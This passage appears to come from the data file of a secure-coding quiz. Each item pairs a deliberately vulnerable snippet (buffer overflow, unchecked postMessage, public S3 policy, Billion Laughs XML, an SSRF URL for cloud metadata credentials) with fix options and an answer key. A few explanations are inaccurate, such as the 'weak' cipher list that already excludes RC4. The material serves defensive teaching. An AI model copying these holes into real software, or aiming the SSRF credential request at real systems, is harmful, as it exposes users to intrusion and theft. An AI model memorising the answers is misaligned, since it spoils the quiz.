    },
    {
        id: '89',
        title: 'Information Disclosure in Server Headers',
        category: 'Info Disclosure',
        difficulty: 'Beginner',
        xp: 40,
        description: 'The server sends response headers like `Server: Apache/2.4.29 (Ubuntu)` or `X-Powered-By: PHP/7.2.24`, which reveal specific technology versions that could help an attacker find known vulnerabilities.',
        vulnerableCode: `// HTTP Response Headers
Server: Apache/2.4.29 (Ubuntu)
X-Powered-By: PHP/7.2.24`,
        language: 'generic',
        options: [
            {
                id: '89a',
                code: `// Configure the web server and application framework to suppress these informational headers.
// E.g., in Nginx: 'server_tokens off;'
// E.g., in Express: 'app.disable('x-powered-by');'`
            },
            {
                id: '89b',
                code: `// Keep the server software updated so there are no known vulnerabilities.`
            },
            {
                id: '89c',
                code: `// Change the header to a fake value to confuse attackers.`
            }
        ],
        correctOptionId: '89a',
        explanation: 'While keeping software updated is crucial, revealing specific version numbers makes an attacker\'s job much easier. Security through obscurity is not a primary defense, but hiding this information is a standard hardening practice. All servers and frameworks should be configured to omit version information in headers.',
    },
    {
        id: '90',
        title: 'Insecure Object Storage in `localStorage`',
        category: 'XSS',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'The application stores a sensitive session token in the browser\'s `localStorage`, making it accessible to any JavaScript running on the page. If an XSS vulnerability exists, the token can be easily stolen.',
        vulnerableCode: `// JavaScript (Client-side)
function handleLogin(response) {
    const token = response.data.token;
    // Storing the token in localStorage is vulnerable to XSS.
    localStorage.setItem('session_token', token);
}`,
        language: 'javascript',
        options: [
            {
                id: '90a',
                code: `// For session tokens, the most secure storage mechanism is a server-set, HttpOnly cookie. This makes it inaccessible to JavaScript.`
            },
            {
                id: '90b',
                code: `// Store the token in a JavaScript variable in memory instead.`
            },
            {
                id: '90c',
                code: `// Encrypt the token before storing it in localStorage.`
            }
        ],
        correctOptionId: '90a',
        explanation: '`localStorage` is vulnerable to XSS because it\'s accessible via JavaScript. Encrypting the token on the client provides no security, as the key would also be in JavaScript. Storing in memory is not persistent. The standard, secure solution for session tokens is to use `HttpOnly` cookies, which the browser will send automatically with requests but will not expose to JavaScript.',
    },
    {
        id: '91',
        title: 'Improper Error Handling',
        category: 'Info Disclosure',
        difficulty: 'Beginner',
        xp: 40,
        description: 'A generic catch-all exception handler prevents the application from crashing but also hides the root cause of errors, making debugging difficult and potentially masking security issues.',
        vulnerableCode: `// Java
try {
    // Risky operation...
} catch (Exception e) {
    // Swallowing the exception is a bad practice.
    System.out.println("An error occurred, but we handled it!");
}`,
        language: 'java',
        options: [
            {
                id: '91a',
                code: '// Catch specific exceptions that you can actually handle. Let unexpected exceptions propagate or be caught by a global handler.'
            },
            {
                id: '91b',
                code: `// At a minimum, log the full exception stack trace before ignoring it.
// e.printStackTrace();`
            },
            {
                id: '91c',
                code: 'Both A and B are important. You should log all exceptions (B), but it is better to catch specific, expected exceptions and have a top-level handler for everything else (A).'
            }
        ],
        correctOptionId: '91c',
        explanation: 'Swallowing exceptions without logging or re-throwing them is a dangerous anti-pattern. You should catch the most specific exceptions possible that you can reasonably recover from. Any unexpected exception should be logged in detail and result in a generic error response.',
    },
    {
        id: '92',
        title: 'Insecure iOS Data Storage (UserDefaults)',
        category: 'Mobile Security',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An iOS application stores a sensitive API token in `UserDefaults` without encryption, making it accessible on a jailbroken device.',
        vulnerableCode: `// Swift
let token = "sensitive-api-token"
// UserDefaults is stored in a plaintext plist file.
UserDefaults.standard.set(token, forKey: "apiToken")`,
        language: 'generic',
        options: [
            {
                id: '92a',
                code: `// Use the iOS Keychain for storing all sensitive data like tokens, passwords, and keys. It is a hardware-backed secure enclave.
// Use a Keychain wrapper library for easier access.`
            },
            {
                id: '92b',
                code: `// Encrypt the data with a hardcoded key before storing it in UserDefaults.`
            },
            {
                id: '92c',
                code: `// Store the token in a variable instead of persisting it.`
            }
        ],
        correctOptionId: '92a',
        explanation: '`UserDefaults` is not secure storage. For all secrets on iOS, the Keychain is the correct place to store them. The Keychain encrypts the data and stores it in a secure enclave, making it inaccessible even on most jailbroken devices.',
    },
    {
        id: '93',
        title: 'Missing `break` in `switch` (Fallthrough)',
        category: 'Broken Access Control',
        difficulty: 'Intermediate',
        xp: 50,
        description: 'A `switch` statement for authorization checks is missing a `break` statement, causing a lower-privileged user to "fall through" into a higher-privileged case.',
        vulnerableCode: `// C#
switch (user.Role)
{
    case "guest":
        // Guest permissions
    case "user": // Missing break! Guests get user permissions.
        grantUserPermissions();
        break;
    case "admin":
        grantAdminPermissions();
        break;
}`,
        language: 'generic',
        options: [
            {
                id: '93a',
                code: `// Add a 'break' statement to each 'case' block to prevent fallthrough.
case "guest":
    grantGuestPermissions();
    break;
case "user":
    grantUserPermissions();
    break;`
            },
            {
                id: '93b',
                code: `// Reverse the order of the cases, putting "admin" first.`
            },
            {
                id: '93c',
                code: `// Use if-else if statements instead of a switch.`
            }
        ],
        correctOptionId: '93a',
        explanation: 'In C-style languages (C++, C#, Java, JavaScript), `switch` statements will fall through to the next case unless you explicitly use a `break` statement. This can be a common source of bugs, especially in authorization logic.',
    },
    {
        id: '94',
        title: 'Use of Deprecated Cryptographic Hash (SHA-1)',
        category: 'Crypto',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'The application uses the SHA-1 hashing algorithm, which is considered cryptographically broken and vulnerable to collision attacks.',
        vulnerableCode: `// Python
import hashlib
data = b"hello"
# SHA-1 is no longer secure.
hashed_data = hashlib.sha1(data).hexdigest()`,
        language: 'python',
        options: [
            {
                id: '94a',
                code: `// Use a modern, secure hashing algorithm from the SHA-2 or SHA-3 family, such as SHA-256.
hashed_data = hashlib.sha256(data).hexdigest()`
            },
            {
                id: '94b',
                code: `// Use MD5 instead.`
            },
            {
                id: '94c',
                code: `// "Salt" the SHA-1 hash to make it more secure.`
            }
        ],
        correctOptionId: '94a',
        explanation: 'Cryptographic hash functions can become weak over time as computing power increases. SHA-1 has been demonstrated to be vulnerable to practical collision attacks and must not be used for security-sensitive purposes like signature generation. SHA-256 is the current industry standard.',
    },
    {
        id: '95',
        title: 'Leaking State in Singleton Object',
        category: 'Business Logic',
        difficulty: 'Advanced',
        xp: 75,
        description: 'A Singleton object in a multi-threaded application has instance variables that store user-specific state. This can cause data from one user\'s request to leak into another\'s.',
        vulnerableCode: `// Java (in a web server)
public class RequestProcessor {
    private static RequestProcessor instance = new RequestProcessor();
    private User currentUser; // This will be shared across all threads!

    public void process(Request req) {
        this.currentUser = req.getUser();
        // ... do something ...
    }
}`,
        language: 'java',
        options: [
            {
                id: '95a',
                code: `// Singleton objects should be stateless. Pass user-specific state as method parameters instead of storing it in instance fields.
public void process(Request req) {
    User currentUser = req.getUser(); // 'currentUser' is now a local variable.
    // ... do something with currentUser ...
}`
            },
            {
                id: '95b',
                code: `// Use the 'synchronized' keyword on the 'process' method.`
            },
            {
                id: '95c',
                code: `// Use a 'ThreadLocal' variable to store the user state.`
            }
        ],
        correctOptionId: '95a',
        explanation: 'In a multi-threaded environment like a web server, Singleton instances are shared across all requests. They must be stateless. Storing request-specific data in an instance variable is a classic bug that leads to race conditions and data leakage. All request-specific state should be passed through method parameters.',
    },
    {
        id: '96',
        title: 'Unsafe Reflection API Usage',
        category: 'RCE',
        difficulty: 'Expert',
        xp: 90,
        description: 'An application uses reflection to dynamically call a method based on user input, which can allow an attacker to call arbitrary methods.',
        vulnerableCode: `// Java
String methodName = request.getParameter("method");
// Attacker can provide "exit" to call System.exit(0)
Method method = System.class.getMethod(methodName, int.class);
method.invoke(null, 0);`,
        language: 'java',
        options: [
            {
                id: '96a',
                code: `// Avoid reflection with user input. Use a 'switch' statement or a 'Map<String, Runnable>' to map allowed input to specific, safe functions.
switch (methodName) {
    case "doSomething":
        doSomething();
        break;
    default:
        throw new IllegalArgumentException("Invalid method");
}`
            },
            {
                id: '96b',
                code: `// Blacklist dangerous method names like "exit".`
            },
            {
                id: '96c',
                code: `// Use the Security Manager to restrict what the reflected method can do.`
            }
        ],
        correctOptionId: '96a',
        explanation: 'Using reflection with user-controlled input is extremely dangerous and often leads to code execution vulnerabilities. The only safe solution is to avoid it entirely. Instead, use a whitelist of allowed action names and map them to the corresponding safe functions to be executed.',
    },
    {
        id: '97',
        title: 'Insecure Temporary File Creation',
        category: 'File Inclusion',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An application creates a temporary file in a shared directory (like `/tmp/`) with a predictable name. An attacker can pre-create a symbolic link with the same name pointing to a sensitive file.',
        vulnerableCode: `// Python
import os
pid = os.getpid()
# Predictable filename
temp_filename = f'/tmp/app_data_{pid}.tmp' 
with open(temp_filename, 'w') as f:
    f.write("secret data")`,
        language: 'python',
        options: [
            {
                id: '97a',
                code: `// Use a secure temporary file creation function from the standard library, which creates a file with a random name and secure permissions.
import tempfile
with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
    f.write("secret data")
    temp_filename = f.name`
            },
            {
                id: '97b',
                code: `// Check if the file already exists before writing to it.`
            },
            {
                id: '97c',
                code: `// Create the temporary file in the user's home directory instead of /tmp.`
            }
        ],
        correctOptionId: '97a',
        explanation: 'Creating temporary files with predictable names is a classic security mistake. Always use the operating system or standard library\'s dedicated functions for creating secure temporary files, as they are designed to handle permissions and avoid race conditions.',
    },
    {
        id: '98',
        title: 'Use of `document.write` after Page Load',
        category: 'XSS',
        difficulty: 'Intermediate',
        xp: 50,
        description: 'Calling `document.write()` after the main page has finished loading will implicitly call `document.open()`, which clears the entire page content. If the input is user-controlled, this can lead to XSS.',
        vulnerableCode: `// JavaScript
// Sometime after the page has loaded...
const userInput = "<script>alert('XSS')</script>";
document.write(userInput); // This replaces the entire page`,
        language: 'javascript',
        options: [
            {
                id: '98a',
                code: `// Never use 'document.write()'. Manipulate the DOM using safe methods like 'createElement' and 'textContent'.
const newDiv = document.createElement('div');
newDiv.textContent = userInput;
document.body.appendChild(newDiv);`
            },
            {
                id: '98b',
                code: `// Only use 'document.write()' during the initial page load.`
            },
            {
                id: '98c',
                code: `// Sanitize the input before passing it to 'document.write()'.`
            }
        ],
        correctOptionId: '98a',
        explanation: '`document.write()` is a legacy function with dangerous side effects and should almost never be used. Modern web development relies on standard DOM manipulation APIs, which are safer and more predictable.',
    },
    {
        id: '99',
        title: 'Missing `autocomplete="new-password"`',
        category: 'Auth',
        difficulty: 'Intermediate',
        xp: 50,
        description: 'A password change or sign-up form does not use `autocomplete="new-password"`, which may cause browsers to autofill the field with a user\'s current, saved password, potentially leading to accidental overwrites or exposure.',
        vulnerableCode: `<!-- Sign-up Form -->
<label>Create Password:</label>
<input type="password" name="password">

<!-- Change Password Form -->
<label>New Password:</label>
<input type="password" name="new_password">`,
        language: 'generic',
        options: [
            {
                id: '99a',
                code: `// Use autocomplete="new-password" for any field where the user is expected to create a new password.
<label>Create Password:</label>
<input type="password" name="password" autocomplete="new-password">`
            },
            {
                id: '99b',
                code: '// Use `autocomplete="off"` to disable autofill completely.'
            },
            {
                id: '99c',
                code: '// Use two separate fields for password and confirmation.'
            }
        ],
        correctOptionId: '99a',
        explanation: 'The HTML `autocomplete` attribute provides a hint to the browser about how to handle form fields. Using `new-password` signals that this is a field for creating a new password, preventing the browser from automatically filling it with a stored one and instead suggesting a new, strong password.',
    },
    {
        id: '100',
        title: 'Insecure TLS/SSL Configuration (Weak Cipher Suites)',
        category: 'Crypto',
        difficulty: 'Advanced',
        xp: 80,
        description: 'A web server is configured to support old, weak, or insecure cipher suites (e.g., those using RC4, 3DES, or export-grade cryptography), making TLS connections vulnerable to decryption.',
        vulnerableCode: `// Nginx Server Configuration
ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;
// A weak cipher suite list that includes outdated ciphers.
ssl_ciphers 'ALL:!ADH:!EXPORT:!DES:!RC4:!MD5:!PSK';`,
        language: 'generic',
        options: [
            {
                id: '100a',
                code: `// Configure the server to only support modern, strong protocols (TLS 1.2 and 1.3) and a limited set of strong cipher suites.
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:...';`
            },
            {
                id: '100b',
                code: `// Rely on the browser to choose a strong cipher suite.`
            },
            {
                id: '100c',
                code: `// Always keep the server operating system updated.`
            }
        ],
        correctOptionId: '100a',
        explanation: 'Server configuration is critical for TLS security. The server must be explicitly configured to disable old protocols like SSLv3 and early TLS, and it must provide a restricted list of modern, strong cipher suites that do not have known vulnerabilities.',
    },
    {
        id: '101',
        title: 'Android WebView JavascriptInterface Exposure',
        category: 'Mobile Security',
        difficulty: 'Advanced',
        xp: 80,
        description: 'A native Android method is exposed to JavaScript in a WebView via `addJavascriptInterface`. If the WebView loads untrusted content, this can be used to execute native code.',
        vulnerableCode: `// Java (Android)
WebView webView = findViewById(R.id.webview);
WebSettings webSettings = webView.getSettings();
webSettings.setJavaScriptEnabled(true);
// Exposing a powerful native object to all JS in the WebView.
webView.addJavascriptInterface(new WebAppInterface(this), "Android");
webView.loadUrl("https://untrusted-site.com");`,
        language: 'java',
        options: [
            {
                id: '101a',
                code: `// On Android API level 17+, you must add the @JavascriptInterface annotation to any method you want exposed.
// This prevents unintended methods from being called.
public class WebAppInterface {
    @JavascriptInterface
    public String getAppVersion() { /* ... */ }
}`
            },
            {
                id: '101b',
                code: `// Do not call 'addJavascriptInterface' when loading untrusted content.`
            },
            {
                id: '101c',
                code: 'Both A and B are necessary. You should only expose interfaces to trusted content, and even then, you must explicitly annotate which methods are callable.'
            }
        ],
        correctOptionId: '101c',
        explanation: '`addJavascriptInterface` is dangerous. The best defense is to not use it with untrusted content (B). If it must be used, you must target API 17+ and explicitly annotate every exposed method with `@JavascriptInterface` to limit the attack surface (A).',
    },
    {
        id: '102',
        title: 'AWS S3 Bucket Publicly Writable',
        category: 'Cloud Security',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'An Amazon S3 bucket has a policy that allows anyone (`"Principal": "*"`) to upload files (`"s3:PutObject"`), potentially leading to storage abuse or serving of malicious content.',
        vulnerableCode: `// S3 Bucket Policy (JSON)
{
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Principal": "*",
        "Action": "s3:PutObject",
        "Resource": "arn:aws:s3:::my-bucket/*"
    }]
}`,
        language: 'generic',
        options: [
            {
                id: '102a',
                code: `// Restrict the 'Principal' to a specific, trusted AWS user or role.
// "Principal": { "AWS": "arn:aws:iam::111122223333:user/MyUser" }`
            },
            {
                id: '102b',
                code: `// Use pre-signed URLs for uploads instead of a wide-open bucket policy.`
            },
            {
                id: '102c',
                code: 'Both A and B are valid solutions. B is often more secure as it grants temporary, specific access, while A is for granting permanent access to a trusted entity.'
            }
        ],
        correctOptionId: '102c',
        explanation: 'Publicly writable S3 buckets are a major security risk. Access should be restricted to specific IAM principals (A). For user uploads, the best practice is to generate temporary pre-signed URLs on the server, which grant time-limited permission to upload a specific object (B).',
    },
    {
        id: '103',
        title: 'Denial of Service (Billion Laughs)',
        category: 'DoS / Abuse',
        difficulty: 'Advanced',
        xp: 80,
        description: 'An XML document uses nested entities to create a denial-of-service attack. A small XML file expands into a huge document in memory, consuming all available RAM.',
        vulnerableCode: `<!-- Malicious XML -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;...">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;...">
  ...
]>
<lolz>&lol9;</lolz>`,
        language: 'generic',
        options: [
            {
                id: '103a',
                code: `// The best defense is to disable Document Type Definitions (DTDs) in the XML parser, as they are required for this attack.
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`
            },
            {
                id: '103b',
                code: `// Limit the size of the incoming XML file.`
            },
            {
                id: '103c',
                code: `// Scan the XML for the string "<!ENTITY".`
            }
        ],
        correctOptionId: '103a',
        explanation: 'This DoS attack relies on entity expansion defined in a DTD. The most effective way to prevent it is to configure the XML parser to completely disallow DTDs, which also prevents other DTD-based attacks like XXE.',
    },
    {
        id: '104',
        title: 'Hardcoded API Key in Client-Side JS',
        category: 'Info Disclosure',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'A secret API key is embedded directly in a public-facing JavaScript file, allowing anyone to view it and abuse the service.',
        vulnerableCode: `// JavaScript in a public .js file
const API_KEY = 'pk_a1b2c3d4e5f6_very_secret';
fetch('https://api.thirdparty.com/charge', {
    headers: { 'Authorization': \`Bearer \${API_KEY}\` }
});`,
        language: 'javascript',
        options: [
            {
                id: '104a',
                code: `// Do not store secret keys on the client-side. Create a backend endpoint that acts as a proxy to the third-party API.
// The secret key is stored securely on your server.
// Client calls -> Your Backend -> Third-Party API`
            },
            {
                id: '104b',
                code: `// Obfuscate the JavaScript code to make the key harder to find.`
            },
            {
                id: '104c',
                code: `// Load the key from a separate, non-indexed '.env' file.`
            }
        ],
        correctOptionId: '104a',
        explanation: 'Any key in client-side code is compromised. The only secure way to use a secret API key is to keep it on a server you control. Your client-side application should make requests to your server, which then adds the secret key and forwards the request to the third-party API.',
    },
    {
        id: '105',
        title: 'Business Logic Flaw: Re-voting',
        category: 'Business Logic',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'An application allows users to vote on a poll, but there is no server-side check to prevent a user from voting multiple times.',
        vulnerableCode: `// API Endpoint to cast a vote
app.post('/poll/:id/vote', (req, res) => {
    const pollId = req.params.id;
    const option = req.body.option;
    // The server increments the vote count without checking if the user already voted.
    db.polls.incrementVote(pollId, option);
    res.send('Vote counted!');
});`,
        language: 'javascript',
        options: [
            {
                id: '105a',
                code: `// Disable the vote button on the front-end after the user clicks it once.`
            },
            {
                id: '105b',
                code: `// The server must track which users have voted on which polls.
// Before counting a vote, check if a record for this user/poll combination already exists.
const hasVoted = db.votes.find({ userId: req.user.id, pollId });
if (!hasVoted) {
    db.polls.incrementVote(...);
    db.votes.create(...);
}`
            },
            {
                id: '105c',
                code: `// Use a cookie to track if the user has voted.`
            }
        ],
        correctOptionId: '105b',
        explanation: 'Client-side controls (A, C) are easily bypassed. The authoritative state must be maintained on the server. The server needs to create a record of each vote and check against those records to prevent duplicates.',
    },
    {
        id: '106',
        title: 'Improper Error Handling in API',
        category: 'Info Disclosure',
        difficulty: 'Beginner',
        xp: 45,
        description: 'A database query fails, and the raw database error message is sent back to the client in the API response.',
        vulnerableCode: `// JavaScript (Node.js API)
try {
    const results = await db.query(someQuery);
    res.json(results);
} catch (err) {
    // Leaking internal database error details to the user.
    res.status(500).json({ error: err.message });
}`,
        language: 'javascript',
        options: [
            {
                id: '106a',
                code: `// In production, log the detailed error for developers and send a generic error message to the client.
catch (err) {
    console.error(err); // Log the real error
    res.status(500).json({ error: 'An internal server error occurred.' });
}`
            },
            {
                id: '106b',
                code: `// Send an empty 200 OK response on error.`
            },
            {
                id: '106c',
                code: `// Wrap the entire application in a single try/catch block.`
            }
        ],
        correctOptionId: '106a',
        explanation: 'Exposing detailed internal error messages can give attackers valuable information about your application\'s structure, database schema, and potential vulnerabilities. Always log the details for yourself and show the user a generic message.',
    },
    {
        id: '107',
        title: 'HTTP Strict Transport Security (HSTS) Missing',
        category: 'Protocol',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'An HTTPS site does not send the HTTP Strict-Transport-Security (HSTS) header, leaving it vulnerable to SSL-stripping man-in-the-middle attacks.',
        vulnerableCode: '// Web server is configured for HTTPS but is missing a critical security header.',
        language: 'generic',
        options: [
            {
                id: '107a',
                code: `// Add the Strict-Transport-Security header to all HTTPS responses.
// Strict-Transport-Security: max-age=31536000; includeSubDomains`
            },
            {
                id: '107b',
                code: `// Always redirect all HTTP traffic to HTTPS.`
            },
            {
                id: '107c',
                code: `// Use an Extended Validation (EV) SSL certificate.`
            },
        ],
        correctOptionId: '107a',
        explanation: 'HSTS is a crucial security mechanism that instructs browsers to *only* communicate with a site over HTTPS, preventing downgrade attacks. While redirecting HTTP to HTTPS is also necessary, the HSTS header provides client-side enforcement.',
    },
    {
        id: '108',
        title: 'Insecure `postMessage` Implementation',
        category: 'XSS',
        difficulty: 'Advanced',
        xp: 75,
        description: 'A web page listens for messages from other windows/iframes but fails to validate the origin of the message, allowing any website to send it commands.',
        vulnerableCode: `// JavaScript
// Listens for a message and executes a function based on it.
window.addEventListener("message", (event) => {
  // No origin check! Any website can send a message.
  if (event.data.action === 'deleteAccount') {
    deleteAccount();
  }
});`,
        language: 'javascript',
        options: [
            {
                id: '108a',
                code: `// Always validate the 'event.origin' to ensure the message is from a trusted domain.
window.addEventListener("message", (event) => {
    if (event.origin !== "https://trusted-sender.example.com") {
        return;
    }
    // ... process message ...
});`
            },
            {
                id: '108b',
                code: `// Check if the data has the correct format.`
            },
            {
                id: '108c',
                code: `// Use a different event name instead of "message".`
            }
        ],
        correctOptionId: '108a',
        explanation: 'When using `postMessage`, the receiving window MUST validate the `origin` property of the event to ensure the message is coming from a trusted source. Failing to do so allows any malicious site to send messages to your window.',
    },
    {
        id: '109',
        title: 'Use of a Component with Known Vulnerabilities',
        category: 'Supply Chain',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'A project includes a version of a popular library (e.g., Log4j, jQuery) that has a well-known, critical security vulnerability.',
        vulnerableCode: `// pom.xml (Java Maven)
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.0</version> <!-- Vulnerable to Log4Shell -->
</dependency>`,
        language: 'generic',
        options: [
            {
                id: '109a',
                code: `// Use a dependency scanning tool (like npm audit, Snyk, Dependabot) to identify vulnerable components.`
            },
            {
                id: '109b',
                code: `// Update the vulnerable library to the latest patched version.
// e.g., Update log4j-core to 2.17.1 or higher.`
            },
            {
                id: '109c',
                code: `// Both A and B are essential parts of a secure development lifecycle.`
            }
        ],
        correctOptionId: '109c',
        explanation: 'Supply chain security requires a proactive approach. You need automated tools to continuously scan for vulnerabilities in your dependencies (A), and a process to quickly test and deploy updates when patched versions become available (B).',
    },
    {
        id: '110',
        title: 'Exposed Cloud Metadata Service',
        category: 'Cloud Security',
        difficulty: 'Advanced',
        xp: 85,
        description: 'An application is vulnerable to SSRF, which an attacker uses to make requests to the cloud provider\'s internal metadata service (e.g., `169.254.169.254`), stealing cloud credentials.',
        vulnerableCode: `// Conceptual SSRF vulnerability
// Attacker provides URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-name
// The application fetches this URL and displays the content, which includes secret access keys.`,
        language: 'generic',
        options: [
            {
                id: '110a',
                code: `// Properly fix the SSRF vulnerability by using a strict whitelist of allowed domains.`
            },
            {
                id: '110b',
                code: `// Configure the instance to use IMDSv2 (Instance Metadata Service Version 2), which requires a session token and protects against basic SSRF.`
            },
            {
                id: '110c',
                code: 'Both A and B are critical defenses. B limits the damage an attacker can do if they steal credentials, and A makes it much harder to steal them in the first place.'
            }
        ],
        correctOptionId: '110c',
        explanation: 'Accessing the cloud metadata service is a primary goal for attackers who find an SSRF vulnerability. Fixing the SSRF itself is the most important step (A). However, modern cloud environments provide hardened metadata services (like IMDSv2) that should be enforced as a powerful defense-in-depth measure (B).',
    },
    {
        id: '111',
        title: 'Android Insecure `BroadcastReceiver`',
        category: 'Mobile Security',
        difficulty: 'Advanced',
        xp: 75,
        description: 'An Android `BroadcastReceiver` is exported and does not require any permissions to receive messages, allowing any app on the device to send it malicious data.',
        vulnerableCode: `<!-- AndroidManifest.xml -->
<receiver android:name=".MyReceiver" android:exported="true">
    <!-- No permissions required! -->
</receiver>`,
        language: 'generic',
        options: [
            {
                id: '111a',
                code: `// If the receiver should only get messages from your own app, set it to be un-exported.
<receiver android:name=".MyReceiver" android:exported="false" />`
            },
            {
                id: '111b',
                code: `// If it must be exported, protect it with a signature-level permission so only apps signed with your key can send it messages.
<permission android:name="com.example.MY_PERMISSION" android:protectionLevel="signature" />
<receiver ... android:permission="com.example.MY_PERMISSION" />`
            },
            {
                id: '111c',
                code: 'Both A and B are valid solutions depending on the use case. A is the most secure if inter-app communication is not needed.'
            }
        ],
        correctOptionId: '111c',
        explanation: 'By default, components should not be exported (A). If a `BroadcastReceiver` must be exported to communicate with other apps you control, it should be protected with a signature-level permission to ensure only your apps can interact with it (B).',
    },
    {
        id: '112',
        title: 'Open Bucket Permissions (Cloud Storage)',
        category: 'Cloud Security',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'A cloud storage bucket (like AWS S3 or Google Cloud Storage) is configured to allow public read access, accidentally exposing sensitive files.',
        vulnerableCode: `// IAM Policy for a GCS Bucket
{
  "bindings": [
    {
      "role": "roles/storage.objectViewer",
      "members": [
        "allUsers" // This makes the bucket public!
      ]
    }
  ]
}`,
        language: 'generic',
        options: [
            {
                id: '112a',
                code: `// Remove the binding that grants access to "allUsers" or "allAuthenticatedUsers".`
            },
            {
                id: '112b',
                code: `// Enable "Block all public access" at the bucket or project level.`
            },
            {
                id: '112c',
                code: 'Both A and B are correct. B provides a fail-safe, while A corrects the underlying misconfiguration.'
            }
        ],
        correctOptionId: '112c',
        explanation: 'Public cloud storage buckets are a major source of data leaks. The best practice is to enable the "Block all public access" setting (B) as a safety net and to also ensure your bucket policies do not grant public access (A).',
    },
    {
        id: '113',
        title: 'Denial of Service (CPU Exhaustion)',
        category: 'DoS / Abuse',
        difficulty: 'Advanced',
        xp: 75,
        description: 'An API endpoint performs a computationally expensive operation (e.g., image processing, complex calculation) without proper input validation or rate limiting, allowing an attacker to exhaust server CPU.',
        vulnerableCode: `// Python API
// This function performs a very slow calculation.
@app.route('/calculate')
def calculate():
    n = int(request.args.get('number'))
    # e.g., calculate the nth prime number, which gets very slow for large n.
    result = slow_prime_calculation(n)
    return str(result)`,
        language: 'python',
        options: [
            {
                id: '113a',
                code: `// Implement strict input validation to cap the size of 'n' to a reasonable number.`
            },
            {
                id: '113b',
                code: `// Apply a strict rate limit to the endpoint, specific to this expensive operation.`
            },
            {
                id: '113c',
                code: 'Both A and B are necessary. You must validate the input to prevent overly expensive individual requests (A) and rate-limit the endpoint to prevent a flood of even valid requests (B).'
            }
        ],
        correctOptionId: '113c',
        explanation: 'Protecting expensive endpoints requires two main defenses: validate the input to prevent a single request from being too resource-intensive (A), and rate-limit the endpoint to prevent an attacker from making too many requests in a short period (B).',
    },
    {
        id: '114',
        title: 'Use After Free',
        category: 'RCE',
        difficulty: 'Expert',
        xp: 100,
        description: 'In a language with manual memory management like C++, a program continues to use a pointer after the memory it points to has been deallocated (`free`d or `delete`d).',
        vulnerableCode: `// C++
int* ptr = new int(10);
delete ptr;
// The memory is free, but the pointer is still used.
if (ptr != nullptr) { // This check is useless
    *ptr = 20; // Use-after-free!
}`,
        language: 'cpp',
        options: [
            {
                id: '114a',
                code: `// Set the pointer to 'nullptr' immediately after deleting it to prevent accidental reuse.
delete ptr;
ptr = nullptr;`
            },
            {
                id: '114b',
                code: `// Use modern C++ smart pointers (like std::unique_ptr or std::shared_ptr) which manage memory automatically and prevent this entire class of bug.`
            },
            {
                id: '114c',
                code: 'Both A and B are valid. A is a manual fix, while B is the modern, idiomatic C++ solution that is much safer.'
            }
        ],
        correctOptionId: '114c',
        explanation: 'Use-after-free is a critical memory corruption vulnerability. Manually nulling out pointers after deletion can help (A), but it is error-prone. The modern and strongly recommended C++ approach is to use smart pointers, which handle the memory management automatically and make this bug impossible (B).',
    },
    {
        id: '115',
        title: 'Integer Overflow',
        category: 'Business Logic',
        difficulty: 'Advanced',
        xp: 75,
        description: 'An arithmetic operation results in a number that is too large for the data type to store, causing it to "wrap around". This can lead to unexpected behavior.',
        vulnerableCode: `// Java
// user.credits is an int with value 2,000,000,000
// Attacker deposits 500,000,000
int new_credits = user.credits + 500000000;
// The result overflows Integer.MAX_VALUE and becomes negative.
user.setCredits(new_credits);`,
        language: 'java',
        options: [
            {
                id: '115a',
                code: `// Use a larger data type that can accommodate the maximum possible value, like 'long' or 'BigInteger'.`
            },
            {
                id: '115b',
                code: `// Check for potential overflow before performing the operation.
if (Integer.MAX_VALUE - amount < user.credits) {
    throw new ArithmeticException("Overflow");
}`
            },
            {
                id: '115c',
                code: 'Both A and B are valid solutions. B provides explicit checking, while A uses a data type that makes overflow much less likely.'
            }
        ],
        correctOptionId: '115c',
        explanation: 'Integer overflows can lead to serious bugs. You can either use a larger data type that can handle the expected range of values (A) or perform explicit checks before the arithmetic operation to detect and prevent the overflow (B).',
    },
    {
        id: '116',
        title: 'Buffer Overflow',
        category: 'RCE',
        difficulty: 'Expert',
        xp: 100,
        description: 'Writing data beyond the boundaries of a fixed-size buffer, overwriting adjacent memory. This can be exploited for denial of service or remote code execution.',
        vulnerableCode: `// C/C++
// An attacker provides a username longer than 15 characters.
char username[16];
strcpy(username, user_input); // No bounds check!`,
        language: 'cpp',
        options: [
            {
                id: '116a',
                code: `// Use a "safe" string copy function that takes the buffer size as an argument.
strncpy(username, user_input, sizeof(username) - 1);
username[sizeof(username) - 1] = '\\0';`
            },
            {
                id: '116b',
                code: `// Use C++ string objects, which handle memory management automatically.
std::string username = user_input;`
            },
            {
                id: '116c',
                code: 'Both A and B are solutions. B is the idiomatic and much safer C++ approach, while A is the required fix in C.'
            }
        ],
        correctOptionId: '116c',
        explanation: 'Buffer overflows are a classic and dangerous C/C++ vulnerability. The C-style fix is to use bounded functions like `strncpy` (A). However, the modern C++ solution is to avoid manual memory management and C-style strings altogether and use `std::string` (B), which makes these bugs impossible.',
    },
    {
        id: '117',
        title: 'Lack of Input Validation (Data Type)',
        category: 'Business Logic',
        difficulty: 'Beginner',
        xp: 40,
        description: 'An API endpoint expects a numeric ID, but receives a string. The backend language (like JavaScript) performs type coercion, leading to unexpected behavior.',
        vulnerableCode: `// JavaScript (Node.js/Express)
// Attacker sends request to /api/items?id[]=...
app.get('/api/items', (req, res) => {
  // 'req.query.id' is now an array, not a number.
